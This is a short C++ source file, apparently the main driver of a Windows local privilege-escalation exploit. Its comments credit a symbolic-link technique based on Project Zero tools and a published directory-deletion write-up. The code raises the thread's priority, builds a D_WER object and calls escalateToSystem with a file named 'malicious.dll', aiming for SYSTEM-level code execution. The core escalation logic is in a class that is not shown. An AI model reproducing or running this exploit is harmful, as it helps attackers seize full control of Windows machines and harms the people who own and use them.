// This code has been developed by @gweeperx (a.k.a Dimopoulos Elias). 
// This code is heavily based on symboliclink testing tools from google's project zero 
// https://github.com/googleprojectzero/symboliclink-testing-tools
// The technique which is implemented here, has been described by @jonasLyk in the following url:
// https://secret.club/2020/04/23/directory-deletion-shell.html

#include "stdafx.h"
#include "D_WER.h"

#include <FileSymlink.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>


int _tmain()
{

	HANDLE exploit = GetCurrentThread();
	SetThreadPriority(exploit, THREAD_PRIORITY_TIME_CRITICAL);

	PWSTR cmdline = GetCommandLineW();
	int argc;
	PWSTR* argv = CommandLineToArgvW(cmdline, &argc);
	LPCWSTR createFile = argv[1];
	bool retval = false;

	
	D_WER* systemElevation;
	systemElevation = new D_WER();
	std::wcout << L"[+] Target Folder: " << systemElevation->get_target_folder() << "\n" << std::endl;
	
	systemElevation->escalateToSystem(L"malicious.dll");

	getchar();

	return 0;
	
}
